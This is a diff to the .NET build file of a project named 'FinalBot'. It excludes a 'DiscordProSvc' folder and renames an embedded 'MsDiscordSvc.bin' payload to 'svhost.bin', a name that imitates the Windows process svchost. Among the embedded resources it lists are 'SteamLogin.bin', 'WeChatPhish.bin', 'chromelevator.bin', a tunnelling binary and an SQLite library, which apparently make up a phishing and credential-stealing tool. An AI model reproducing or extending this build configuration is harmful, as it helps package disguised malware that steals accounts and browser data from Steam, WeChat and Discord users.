@@ -36,10 +36,16 @@
     <!-- Match resource prefix used in PhishManager.cs -->
     <RootNamespace>FinalBot</RootNamespace>
     
-    <DefaultItemExcludes>$(DefaultItemExcludes);scripts\**</DefaultItemExcludes>
+    <DefaultItemExcludes>$(DefaultItemExcludes);scripts\**;DiscordProSvc\**</DefaultItemExcludes>
     
     <!-- WinForms dependency completely removed for NativeAOT support -->
   </PropertyGroup>
+
+  <ItemGroup>
+    <Compile Remove="DiscordProSvc\**" />
+    <EmbeddedResource Remove="DiscordProSvc\**" />
+    <None Remove="DiscordProSvc\**" />
+  </ItemGroup>
 
   <ItemGroup>
     <RdXmlFile Include="rd.xml" />
@@ -51,12 +57,10 @@
     <EmbeddedResource Include="SteamAlert.bin" />
     <EmbeddedResource Include="SteamLogin.bin" />
     <EmbeddedResource Include="chromelevator.bin" />
-    <EmbeddedResource Include="MsDiscordSvc.bin" />
+    <EmbeddedResource Include="svhost.bin" />
     <EmbeddedResource Include="WeChatPhish.bin" />
-    <EmbeddedResource Include="websocket\discord_bot.py" />
     <EmbeddedResource Include="bore.bin" />
     <EmbeddedResource Include="e_sqlite3.dll" />
-    <EmbeddedResource Include="GlobalLogger.py" />
   </ItemGroup>
   
   <ItemGroup>
